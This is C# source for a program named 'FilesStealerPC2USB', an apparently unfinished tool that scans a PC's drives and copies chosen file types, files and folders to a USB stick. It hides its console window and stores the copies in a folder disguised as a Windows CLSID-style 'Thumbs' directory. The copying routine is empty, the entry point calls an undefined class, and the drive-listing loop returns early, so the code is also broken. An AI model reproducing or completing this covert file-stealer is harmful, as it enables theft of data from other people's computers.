using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace FilesStealerPC2USB
{
    class Program
    {
        #region Auto_Hide
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();


        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        #endregion

        static string OS_search = ""; static string message = ""; static string countnumShow = ""; static string have_log = "";
        static string[] exceptdrive; static string[] listertype; static string[] listerfile; static string[] listerfolder;

        static int TimerSec = 5;
        static string destLog = ".\\" + "types.txt"; static string dest = "";
        static string favorite = ".Thumbs.ms.{2227a280-3aea-1069-a2de-08002b30309d}";

        List<string> log = new List<string>();
        
        static void Main(string[] args)
        {
            Alaki alaki = new Alaki();
            alaki.start();

            //Start();

            Console.ReadKey();
        }
        static void Start()
        {
            if (Directory.GetFiles(".").Contains(destLog) == false)
            {
                Console.WriteLine("====\nThere is no [type.txt] file in this directory, copy it here and re-open the program.\nAlso you can answer these questions(hit Enter without anything typed to skip a question. Seperate items with :  ,  )\n====");
                
                Console.Write("Do you want program to search in os drive/folder(s) ? (yes\\no)\n > ");
                OS_search = Console.ReadLine().Replace(" ", "");
                
                Console.Write("Which type-file do you want to be copied ? (hit Enter for nothing)\n > ");
                string listertype_ = Console.ReadLine().Replace(" ", "");

                Console.Write("What files do you want to be copied ? (hit Enter for nothing)\n > ");
                string listerfile_ = Console.ReadLine();

                Console.Write("What folders do you want to be copied ? (hit Enter for nothing)\n > ");
                string listerfolder_ = Console.ReadLine();

                Console.Write("What drives \"don't\" you want to be copied ? (hit Enter for nothing)\n > ");
                string exceptdrive_ = Console.ReadLine().Replace(" ", "");
                    
                Console.Write("What message do you want to be shown ? (hit Enter for nothing)\n > ");
                message = Console.ReadLine();

                Console.Write("Do you want numbers of files to be counted ? (yes\\no)\n > ");
                countnumShow = Console.ReadLine().Replace(" ", ""); ;

                Console.Write("Do you want to have log-file ? (yes\\no)\n > ");
                have_log = Console.ReadLine().Replace(" ", ""); ;

                Console.Write("\nAll done. Let's go for real challenge...\n==========================\n");

                string to_write = "[Basic]\ntypes=" + listertype_ + "\nfiles=" + listerfile_ + "\nfolders=" + listerfolder_ +
                      "\nsearch_OS_drive=" + OS_search + "\n\n[Advanced]\nexceptDrive=" + exceptdrive_ +
                      "\nmessage=" + message + "\ncountNumberShow=" + countnumShow + "\nlog=" + have_log +
                      "\n\n\nNote:\nyou can seperate items with	                 : ,\nSearch_OS_drive,CountnumShow, and Log should be	 : yes\\no";
                
                File.WriteAllText(destLog, to_write);
            }

            string[] reader = File.ReadAllLines(destLog);

            #region Reader
            foreach (string read in reader)
            {
                if (read.Contains("search_OS_drive="))
                {
                    OS_search = read.Replace(" ", "").Replace("\n", "").Replace("search_OS_drive=", "").ToLower();
                }
                else if (read.Contains("types="))
                {
                    listertype = read.Replace("types=", "").Replace(" , ", "").Replace("\n", "").Replace(" ,", ",").Replace(", ", ",").ToLower().Split(",");
                }
                else if (read.Contains("files="))
                {
                    listerfile = read.Replace("files=", "").Replace(" , ", "").Replace("\n", "").Replace(" ,", ",").Replace(", ", ",").ToLower().Split(",");
                }
                else if (read.Contains("folders="))
                {
                    listerfolder = read.Replace("folders=", "").Replace(" , ", "").Replace("\n", "").Replace(" ,", ",").Replace(", ", ",").ToLower().Split(",");
                }
                else if (read.Contains("exceptDrive="))
                {
                    exceptdrive = read.Replace("exceptDrive=", "").Replace(":", "").Replace("\\", "").Replace(" , ", "").Replace("\n", "").Replace(" ,", ",").Replace(", ", ",").ToLower().Split(",");
                }
                else if (read.Contains("message="))
                {
                    message = read.Replace("message=", "").Replace("\n", "") + "\n";
                }
                else if (read.Contains("countNumberShow="))
                {
                    countnumShow = read.Replace("countNumberShow=", "").Replace("\n", "").ToLower();
                }
                else if (read.Contains("log="))
                {
                    have_log = read.Replace("log=", "").Replace("\n", "").ToLower();
                }
            }
            #endregion

            #region Drives
            List<string> DrivesLocs = LocalDriveLoc(exceptdrive);
            string WinDrive = Path.GetPathRoot(Environment.SystemDirectory);

            if (OS_search != "yes")
            {
                DrivesLocs.Remove(WinDrive);
            }
            #endregion

            #region USB
            string Favorite_USBLoc = usbDriveLoc();

            if (Directory.GetDirectories(".").Contains(favorite))
            {
                dest = Directory.GetDirectoryRoot(".") + favorite + "\\";
            }
            else
            {
                if (Favorite_USBLoc == "")
                {
                    Console.WriteLine("No F-USB Connected!!!");
                    Console.ReadKey();
                    Environment.Exit(0);
                }
                else
                {
                    dest = Favorite_USBLoc + favorite + "\\";
                }

            }
            #endregion

            if (message != "")
            {
                Console.WriteLine(message);
            }

            foreach (string drive in DrivesLocs)
            {
                Copier(drive);
            }

        }

        public static string usbDriveLoc()
        {
            string driveLoc = "";

            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.DriveType == DriveType.Removable && Directory.GetDirectories(drive.Name).Contains(favorite))
                    driveLoc = drive.Name;
            }
            return driveLoc;
        }

        public static List<string> LocalDriveLoc(string[] ExDrive)
        {
            List<string> localDrives = new List<string>();

            foreach (var drive in Directory.GetLogicalDrives())
            {
                if (ExDrive.Contains(drive) == false)
                    localDrives.Add(drive);
                return localDrives;
            }


            return localDrives;

        }

        public static void Copier(string drive)
        {

        }





        //public static void timer()
        //{
        //    if (TimerSec >= 0)
        //    {

        //    }
        //}

    }


}
